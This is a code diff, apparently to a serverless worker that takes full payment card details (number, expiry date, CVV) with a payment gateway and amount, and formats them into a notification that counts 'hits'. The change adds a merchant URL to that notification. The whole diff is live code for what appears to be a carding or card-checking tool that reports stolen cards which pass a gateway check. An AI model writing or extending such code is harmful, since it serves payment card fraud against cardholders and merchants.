@@ -231,7 +231,7 @@ export default {
         if (!s) return json({ error: "unauthorized" }, { status: 401, headers: cors });
 
         const body = await req.json().catch(() => ({}));
-        const { card, gate, time, amount, extra } = body;
+        const { card, gate, time, amount, extra, merchUrl } = body;
         const now = Math.floor(Date.now() / 1000);
 
         // Parse full card (format: number|mm/yy|cvv  or  number|mm|yy|cvv)
@@ -323,6 +323,7 @@ export default {
           (cardMonth && cardYear ? `📅 *Exp:* \`${escMd(cardMonth)}/${escMd(cardYear)}\`\n` : "") +
           (cardCvv ? `🔑 *CVV:* \`${escMd(cardCvv)}\`\n` : "") +
           `🏪 *Gateway:* ${gatewayEsc}\n` +
+          (merchUrl ? `🛍 *Merchant:* ${escMd(merchUrl)}\n` : "") +
           (amountEsc ? `💰 *Amount:* ${amountEsc}\n` : "") +
           `📊 *Total hits:* ${totalHits}\n` +
           `⏰ *Time:* ${escMd(ts)}\n` +
